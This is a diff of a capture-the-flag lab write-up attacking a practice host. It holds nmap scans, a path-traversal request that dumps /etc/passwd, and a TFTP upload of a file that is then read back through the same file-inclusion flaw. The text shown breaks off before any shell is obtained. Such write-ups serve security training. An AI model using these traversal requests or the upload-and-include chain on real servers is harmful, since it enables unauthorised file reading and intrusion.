@@ -59,7 +59,7 @@ only port found open was port 80 http so going to try UDP also
 nmap -sU -v 10.10.10.55
 ```
 
-*This will take some time so going to check out web site in browser
+#This will take some time so going to check out web site in browser
 
 Look at the webpage does not seem too special so take a look at page source and I see this in the URL block
 
@@ -71,7 +71,7 @@ the URL has a tell for possible local file include to try
 
 First it is *PHP
 
-Second it has *?file= in the URL
+Second it has ?file= in the URL
 
 The common path to check if it is vulnerable to LFI is the *../../../../etc/passwd file path
 
@@ -103,13 +103,13 @@ systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nol
 syslog:x:102:106::/home/syslog:/usr/sbin/nologin
 messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
 _apt:x:104:65534::/nonexistent:/usr/sbin/nologin
-lxd:x:105:65534::/var/lib/lxd/:/bin/false
+*lxd:x:105:65534::/var/lib/lxd/:/bin/false
 uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
 dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
 landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
 pollinate:x:109:1::/var/cache/pollinate:/bin/false
-mike:x:1000:1000:mike:/home/mike:/bin/bash
-tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin
+*mike:x:1000:1000:mike:/home/mike:/bin/bash
+*tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin
 ```
 
 *Oh look!* we have good intel here 
@@ -127,6 +127,85 @@ Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-19 20:47 EST
 PORT   STATE         SERVICE
 *69/udp open|filtered tftp*
 ```
+
+#Gain a foothold
+
+I know TFTP is running so going to try and connect to that but need some basic commands
+
+```yaml
+Invoking TFTP
+To invoke TFTP, enter at the DCL prompt:
+
+TFTP [host [port]]
+
+┌──(root💀kali)-[~]
+└─# tftp 10.10.10.55
+tftp> help
+?Invalid command
+tftp> get
+(files) 
+usage: get host:file host:file ... file, or
+       get file file ... file   if connected, or
+       get host:rfile lfile
+tftp> ls
+?Invalid command
+tftp> quit
+                                                                                             
+```
+So it is working now test it by using PUT to put a test file on the server in the tftp directory
+
+Make a file locally ant the connect to TFTP and put the file
+
+touch 55test.txt > nano 55test.txt > this is a test file > save
+
+this works too
+```yaml
+┌──(root💀kali)-[~]
+└─# echo "this is a test" > test.txt
+
+```
+Now to send it - looks like it worked
+```yaml
+┌──(root💀kali)-[~]
+└─# tftp 10.10.10.55
+tftp> put test.txt
+Sent 16 bytes in 0.1 seconds
+tftp> 
+
+```
+Now to test if I can get to files placed in the tftp folder from the web browser
+
+##Research:
+
+```yaml
+The default configuration file for tftpd-hpa is /etc/default/tftpd-hpa. The default root directory where files will be stored is /var/lib/tftpboot.Nov 19, 2015
+```
+Yes we can! -- go to URL http://10.10.10.55/?file=../../../../var/lib/tftpboot/test.txt
+
+and View source URL - view-source:http://10.10.10.55/?file=../../../../var/lib/tftpboot/test.txt
+```yaml
+this is a test
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title></titl
+...
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
